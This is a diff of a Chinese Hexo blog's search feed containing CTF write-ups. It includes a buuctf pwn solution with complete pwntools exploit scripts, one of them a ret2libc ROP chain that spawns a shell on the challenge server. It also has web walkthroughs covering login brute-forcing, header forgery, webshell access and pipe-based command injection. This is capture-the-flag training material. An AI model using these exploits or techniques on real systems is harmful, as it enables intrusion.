+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389165705.png" class="" width="1568389165705">
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389212921.png" class="" width="1568389212921">
+<p>再看一下11.28125在程序中的表示：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389275163.png" class="" width="1568389275163">
+<p>也就是让v2变成41348000h，所以exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_n_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20137</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span> * <span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568386840196.png" class="" width="1568386840196">
+<p>我去，居然告诉我没有flag，可能是出题的时候环境配的有问题吧，或者是就是个坑。</p>
+<p>不过没关系，那就ROP，具体没啥好说的和前几道题都差不多，，不多说了。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_n_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20137</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/ciscn_2019_n_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400793</span></span><br><span class="line">start = <span class="number">0x4006DC</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got = e.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">log.success(<span class="string">&#x27;gets_got =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_got)))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload1 += p64(rdi_addr) + p64(gets_got) + p64(puts_plt)</span><br><span class="line">payload1 += p64(start)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;11.28125\n&#x27;</span>)</span><br><span class="line">gets_leak = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;gets_leak_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_leak)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;gets&#x27;</span>, gets_leak)</span><br><span class="line">libc_base = gets_leak - libc.dump(<span class="string">&#x27;gets&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;bin_sh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>取得shell，得到flag：</p>
+<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568423814631.png" class="" width="1568423814631">
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -530,6 +499,37 @@ href="https://blog.csdn.net/qq_45552960/article/details/104576189">关于命令�
         <tag>CTF</tag>
         <tag>web</tag>
         <tag>ctfhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo折腾实录</title>
+    <url>/2024/06/11/hexo/</url>
+    <content><![CDATA[<p>戳👉<a
+href="https://hexo.io/docs/">hexo官方文档</a>阅读官方文档。</p>
+<h3 id="使用next模板">使用next模板</h3>
+<p><a
+href="https://theme-next.js.org/docs/getting-started/">官方教程</a>
+为了方便后续配置，可以使用如下命令建立符号连接</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s node_modules/hexo-theme-next/_config.yml _config.next.yml</span><br></pre></td></tr></table></figure>
+<h3 id="自定义新建post文章的yaml">自定义新建post文章的yaml</h3>
+<p>修改scaffold中的post.md.</p>
+<h3
+id="设置hexo首页只显示文章部分摘要">设置hexo首页只显示文章部分摘要</h3>
+<p>针对next主题，有两种方法。</p>
+<ol type="1">
+<li><p>添加文章概述</p>
+<p>在开头的yaml中加入<code>description: xxx</code>，这样的话就只会显示<code>description</code>了。</p></li>
+<li><p>在文章中想截断的部分加入<code>&lt;!--more--&gt;</code></p></li>
+</ol>
+<h3 id="让hexo支持数学公式">让hexo支持数学公式</h3>
+<p>有问题先看<a
+href="https://theme-next.js.org/docs/third-party-services/math-equations.html">官方教程</a>！找了很多博客都不行。</p>
+]]></content>
+      <categories>
+        <category>Tinker</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1311,6 +1311,134 @@ shell，由于我不会js，我刚开始看的时候毫无头绪，还是用传�
       </tags>
   </entry>
   <entry>
+    <title>攻防世界web新手训练</title>
+    <url>/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/</url>
+    <content><![CDATA[<h1 id="view_source">view_source</h1>
+<p>F12看源码</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105543297.png" class="" title="image-20200717105543297">
+<h1 id="get_post">get_post</h1>
+<p>进入链接后提示如下：</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105042516.png" class="" title="image-20200717105042516">
+<p>构造url</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105235135.png" class="" title="image-20200717105235135">
+<p>提交后提示如下：</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105348157.png" class="" title="image-20200717105348157">
+<p>再次构造url</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105410671.png" class="" title="image-20200717105410671">
+<p>提交得到flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105433487.png" class="" title="image-20200717105433487">
+<h1 id="robots">robots</h1>
+<p>进入链接后什么都没有</p>
+<p>看看robots.txt</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105816695.png" class="" title="image-20200717105816695">
+<p>可以看到disallow的位置就是我们要找的flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105903647.png" class="" title="image-20200717105903647">
+<h1 id="backup">backup</h1>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110737642.png" class="" title="image-20200717110737642">
+<p>看到index.php，我们看看</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110832971.png" class="" title="image-20200717110832971">
+<p>发现没有什么变化，那么根据提示，我们看看备份文件，一般备份文件的后缀是.bak</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110927693.png" class="" title="image-20200717110927693">
+<p>当我们输入index.php.bak时可以下载该文件，下载后打开，得到flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111007209.png" class="" title="image-20200717111007209">
+<h1 id="cookie">cookie</h1>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111232613.png" class="" title="image-20200717111232613">
+<p>抓包看看</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111309876.png" class="" title="image-20200717111309876">
+<p>那我们就看看cookie.php</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111344601.png" class="" title="image-20200717111344601">
+<p>提示我们看看响应包，得到flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111438468.png" class="" title="image-20200717111438468">
+<h1 id="disabled_button">disabled_button</h1>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113546553.png" class="" title="image-20200717113546553">
+<p>看看这个按钮</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113711469.png" class="" title="image-20200717113711469">
+<p>可以看到这个按钮的作用实际上就是post传递一个auth=flag，那么我们自己传这样一个参数，得到flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113819628.png" class="" title="image-20200717113819628">
+<h1 id="weak_auth">weak_auth</h1>
+<p>进入后是一个登陆界面，随便输一个用户名密码</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114325671.png" class="" title="image-20200717114325671">
+<p>说明用户是admin</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114352984.png" class="" title="image-20200717114352984">
+<p>可以看到这个题就是暴力破解，那么放到burp suite里跑个字典</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114500113.png" class="" title="image-20200717114500113">
+<p>可以看到密码就是123456</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114523421.png" class="" title="image-20200717114523421">
+<p>得到flag</p>
+<h1 id="simple_php">simple_php</h1>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114651376.png" class="" title="image-20200717114651376">
+<p>看php代码说明我们要构造a和b，让a和b的值都满足条件，就可以获得flag</p>
+<p>那么首先看a，要a=0为真，a为真，所以a不可能等于0，要想解决这个问题，首先我们要知道php的特性。</p>
+<p>由于php为弱类型语言，因此当不同类型的值进行==比较的时候会发生类型转换。正常情况下不同类型的值是不能比较的，php
+为了比较进行了数据类型转换。把不同类型的值转换为相同类型后再比较。</p>
+<p>具体转换规则可以看这篇文章《<a
+href="https://www.cnblogs.com/beenupper/p/12635779.html">彻底解决php判断a==0为真引发的问题-类型转换</a>》，这里不再赘述。</p>
+<p>知道了转换规则，那么我们就可以构造了，得到flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717115934924.png" class="" title="image-20200717115934924">
+<h1 id="xff_referer">xff_referer</h1>
+<p>进入后提示如下：</p>
+<p>那么我们就在请求包中通过x-forwarded-for伪造ip</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162612014.png" class="" title="image-20200717162612014">
+<p>注意xff加入的位置，我之前加入到末尾发现页面一直在加载没有响应，我想xff写在请求头中间就好了。</p>
+<p>然后发现提示变化：</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717161539728.png" class="" title="image-20200717161539728">
+<p>那么在伪造referer</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162711288.png" class="" title="image-20200717162711288">
+<p>得到flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717162734141.png" class="" title="image-20200717162734141">
+<h1 id="webshell">webshell</h1>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170244887.png" class="" title="image-20200717170244887">
+<p>php的一句话木马，使用中国菜刀连接，中国菜刀可以从这个<a
+href="https://github.com/raddyfiy/caidao-official-version">地方</a>下载，</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170319974.png" class="" title="image-20200717170319974">
+<p>即可进入服务器</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170345624.png" class="" title="image-20200717170345624">
+<p>获得flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170404876.png" class="" title="image-20200717170404876">
+<p>当然，如果没有工具，那就手动构造请求post包</p>
+<p>一句话木马中的变量是shell，所以我们传的变量就是shell</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170710704.png" class="" title="image-20200717170710704">
+<p>可以看到返回了当前路径的所有文件，看到了flag.txt</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717170754480.png" class="" title="image-20200717170754480">
+<p>得到flag</p>
+<h1 id="command_execution">command_execution</h1>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172147730.png" class="" title="image-20200717172147730">
+<p>尝试ping一下本机127.0.0.1</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172220593.png" class="" title="image-20200717172220593">
+<p>可以看到ping的结果返回到了页面，那么尝试命令注入</p>
+<p>命令注入有很多种方法，可以参考这两篇文章：<a
+href="https://blog.csdn.net/u014549283/article/details/81783164">文章1</a>，<a
+href="https://blog.csdn.net/qq_41079177/article/details/88321816?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.compare">文章2</a>，这里不再赘述</p>
+<p>这道题比较简单，没有waf，不需要绕过，我使用 | 进行注入</p>
+<p>command 1 | command 2 只执行command2</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172637290.png" class="" title="image-20200717172637290">
+<p>可以看到执行了ls命令，现在找flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172921373.png" class="" title="image-20200717172921373">
+<p>得到flag</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172957802.png" class="" title="image-20200717172957802">
+<h1 id="simple_js">simple_js</h1>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181134028.png" class="" title="image-20200717181134028">
+<p>随便输一个</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181148627.png" class="" title="image-20200717181148627">
+<p>看看源码，调试一下js</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181218694.png" class="" title="image-20200717181218694">
+<p>发现不论输入的密码是什么，最后都会跳到假密码FAUX PASSWORD HAHA</p>
+<p>而真密码是初始的pass_enc</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181342602.png" class="" title="image-20200717181342602">
+<p>那么就把pass的值改为pass_enc，执行一下，注意14行的tab2下标要改成10，因为默认的pass长度为18，而修改后的pass长度为11，所以要修改，否则最后执行的时候p加入的就不是pass的最后一个值了（这个地方坑了我好久）</p>
+<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181443038.png" class="" title="image-20200717181443038">
+<p>把获取到的字符串加上题目要求的flag格式即可得到flag</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web security</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界逆向新手训练</title>
     <url>/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/</url>
     <content><![CDATA[<p>本来是搞Web的（虽然菜的抠脚），但是战队缺reverse和pwn的人，正好自己对这方面也很有兴趣，于是就转了方向。刚学几天，先做上几道攻防世界的新手训练题。把自己做题的过程和学到的知识记录下来。由于我在做的过程中很多时候都是瞎试试出来的，所以记录的时候分成两部分，第一部分是【做题实录】，就是我做题的真实思考过程，flag可能是瞎猜猜出来的，有很多的运气成分在。第二部分是【分析总结】，是我在网上查阅大佬的“正确做法”，即通过分析和思考，用正统做法得出flag。分析总结中我会把我复现的写出来。由于我实在是逆向小白，可能大部分都是靠运气做出来的，大佬勿喷，估计以后再回头看自己的解法自己都要笑死了。</p>
@@ -1568,134 +1696,6 @@ RE csaw2013reversing2</a></p>
       <tags>
         <tag>CTF</tag>
         <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界web新手训练</title>
-    <url>/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/</url>
-    <content><![CDATA[<h1 id="view_source">view_source</h1>
-<p>F12看源码</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105543297.png" class="" title="image-20200717105543297">
-<h1 id="get_post">get_post</h1>
-<p>进入链接后提示如下：</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105042516.png" class="" title="image-20200717105042516">
-<p>构造url</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105235135.png" class="" title="image-20200717105235135">
-<p>提交后提示如下：</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105348157.png" class="" title="image-20200717105348157">
-<p>再次构造url</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105410671.png" class="" title="image-20200717105410671">
-<p>提交得到flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105433487.png" class="" title="image-20200717105433487">
-<h1 id="robots">robots</h1>
-<p>进入链接后什么都没有</p>
-<p>看看robots.txt</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105816695.png" class="" title="image-20200717105816695">
-<p>可以看到disallow的位置就是我们要找的flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717105903647.png" class="" title="image-20200717105903647">
-<h1 id="backup">backup</h1>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110737642.png" class="" title="image-20200717110737642">
-<p>看到index.php，我们看看</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110832971.png" class="" title="image-20200717110832971">
-<p>发现没有什么变化，那么根据提示，我们看看备份文件，一般备份文件的后缀是.bak</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717110927693.png" class="" title="image-20200717110927693">
-<p>当我们输入index.php.bak时可以下载该文件，下载后打开，得到flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111007209.png" class="" title="image-20200717111007209">
-<h1 id="cookie">cookie</h1>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111232613.png" class="" title="image-20200717111232613">
-<p>抓包看看</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111309876.png" class="" title="image-20200717111309876">
-<p>那我们就看看cookie.php</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111344601.png" class="" title="image-20200717111344601">
-<p>提示我们看看响应包，得到flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717111438468.png" class="" title="image-20200717111438468">
-<h1 id="disabled_button">disabled_button</h1>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113546553.png" class="" title="image-20200717113546553">
-<p>看看这个按钮</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113711469.png" class="" title="image-20200717113711469">
-<p>可以看到这个按钮的作用实际上就是post传递一个auth=flag，那么我们自己传这样一个参数，得到flag</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717113819628.png" class="" title="image-20200717113819628">
-<h1 id="weak_auth">weak_auth</h1>
-<p>进入后是一个登陆界面，随便输一个用户名密码</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114325671.png" class="" title="image-20200717114325671">
-<p>说明用户是admin</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114352984.png" class="" title="image-20200717114352984">
-<p>可以看到这个题就是暴力破解，那么放到burp suite里跑个字典</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114500113.png" class="" title="image-20200717114500113">
-<p>可以看到密码就是123456</p>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114523421.png" class="" title="image-20200717114523421">
-<p>得到flag</p>
-<h1 id="simple_php">simple_php</h1>
-<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717114651376.png" class="" title="image-20200717114651376">
-<p>看php代码说明我们要构造a和b，让a和b的值都满足条件，就可以获得flag</p>
-<p>那么首先看a，要a=0为真，a为真，所以a不可能等于0，要想解决这个问题，首先我们要知道php的特性。</p>
-<p>由于php为弱类型语言，因此当不同类型的值进行==比较的时候会发生类型转换。正常情况下不同类型的值是不能比较的，php
-为了比较进行了数据类型转换。把不同类型的值转换为相同类型后再比较。</p>
-<p>具体转换规则可以看这篇文章《<a
